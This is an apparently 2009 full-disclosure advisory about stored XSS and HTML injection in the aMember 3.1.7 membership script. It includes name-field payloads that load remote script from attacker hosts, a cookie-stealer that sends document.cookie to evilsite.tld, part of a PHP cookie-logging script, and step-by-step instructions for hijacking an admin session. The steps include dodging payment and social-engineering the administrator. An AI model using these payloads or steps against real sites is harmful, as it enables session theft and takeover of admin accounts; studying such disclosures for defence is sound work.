<html><head><title>AMember 3.1.7 (XSS/SQL/HI) Multiple Remote Vulnerabilities</title></head><pre>AMember - Multiple Vulnerabilities

Version Affected: 3.1.7 (Apr-10-2009) (newest)

Info: aMember is a flexible membership and subscription management PHP script. It has support for
PayPal, BeanStream, 2Checkout, NoChex, VeriSign PayFlow, Authorize.Net, PaySystems, Probilling,
Multicards, E-Gold and Clickbank payment systems (see list of integrated payment systems) and
allows you to setup paid-membership areas on your site. It can also be used without any payment
system - you can manage users manually.

aMember Pro also supports integration plugins to link users database with third-party scripts,
for example vBulletin, Joomla, WordPress (see list of integration plugins).
aMember is a perfect membership software for selling digital subscriptions and downloads.

Opinion: CGI Systems' website has an XSS issue too, they obviously don't realise the impact of XSS.

-- More files might be affected, the depth of SQL Injection was not checked!


-:: Solution ::-
All the files are encrypted according to CGI Systems' website.

Questions and answers (quote)

I've downloaded aMember, but the source code is corrupted. How can I download it again ?
The source code is not corrupted, but it is encrypted with Zend Encoder or IonCube Encoder technology

Which essentially mean i was unable to find any solution to the problem.
I believe this vulnerability might be exploited in the wild due to it is very
easy to find and take advantage of. (if you know what you're looking for)

Addition: The most easy solution would be to use a regular expression to fix this issue.


-:: Ways of abusing the HTML Injection and XSS ::-
The following are examples of what you can input as first- and/or last-name:
&quot;&gt;&lt;SCRIPT SRC=//intern0t.net/.j&gt;
- Works only in FireFox and NetScape 8.1-G (Gecko)

Protocol resolution in script tags. This particular variant was submitted by Łukasz Pilorz and was based
partially off of Ozh's protocol resolution bypass below. This cross site scripting example works in IE,
Netscape in IE rendering mode and Opera if you add in a &lt;/SCRIPT&gt; tag at the end. However, this is
especially useful where space is an issue, and of course, the shorter your domain, the better. The &quot;.j&quot; is
valid, regardless of the encoding type because the browser knows it in context of a SCRIPT tag.

Firstname: &quot;&gt;&lt;script src=&quot;//intern0t.net/.j
Lastname: &quot;&gt;&lt;/script&gt; &lt;/
- Works in FireFox but should work in all browsers.

Firstname: &quot;&gt;&lt;iframe src=&quot;http://google.com
Lastname: &quot;&gt;&lt;/iframe&gt; &lt;/
- Works in all browsers.

Firstname: &quot;&gt;&lt;iframe src=&quot;//intern0t.net
Lastname: &quot;&gt;&lt;/iframe&gt; &lt;/
- Should work in all browsers as well. (tested in FireFox)

The following is an example of how a cookie stealer will work in conjunction with the exploit:
&lt;script&gt;document.location=%22http://evilsite.tld/cookiestealer.php?cookie=%22 %2B document.cookie;&lt;/script&gt;
- The reason why &quot;browser-hex&quot; is used is because the above would else issue an error and thereby not work.

if (getenv(&quot;HTTP_CLIENT_IP&quot;) &amp;&amp; strcasecmp(getenv(&quot;HTTP_CLIENT_IP&quot;), &quot;unknown&quot;))
$ip = getenv(&quot;HTTP_CLIENT_IP&quot;);
else if (getenv(&quot;HTTP_X_FORWARDED_FOR&quot;) &amp;&amp; strcasecmp(getenv(&quot;HTTP_X_FORWARDED_FOR&quot;), &quot;unknown&quot;))
$ip = getenv(&quot;HTTP_X_FORWARDED_FOR&quot;);

fputs($log, &quot;IP: $ip | PORT: $rem_port | HOST: $rem_host | Agent: $user_agent | METHOD: $rqst_method | REF: $referer | DATE{ : } $date | COOKIE: $cookie &lt;br&gt;&quot;);

fclose($log);
}

logData();

?&gt;

When you have gotten a hash from the admin of the victim site you can issue:
Javascript:void(document.cookie=&quot;PHPSESSID=hash&quot;) (where hash is the PHPSESSID hash/cookie)

What's the first thing you could do as admin?
http://www.website.tld/amember/admin/backup.php

What's the best way to exploit the vulnerability?
1) Make a file named: .j (and upload to a domain which has a name equal to or shorter than 8 characters)

2) The file should contain the following:
HTML Code:

document.location='http://evilsite.tld/cookielogger.php?cookie=' + document.cookie;

3) Sign up and make you first name: (try aff_signup.php to avoid paying!)
&quot;&gt;&lt;script src=&quot;//evilsite.tld/.j

4) Make your last name:
&quot;&gt;&lt;/script&gt; &lt;/

5) Make your username:
aaaaaaaaa

6) After signing up, go to profile.php and make sure the first- and last-name are correct.

7) Wait or social engineer the administrator to click: &quot;Browse Users&quot; in his admin panel, that's all!


Conclusion:
The vendor was (originally) not contacted due to they have encrypted all of
the files and because i believe in full disclosure and open source!

The vendor was contacted the 25th May due to the vulnerability might be
exploited more than usual in the wild after public disclosure the 14th May.
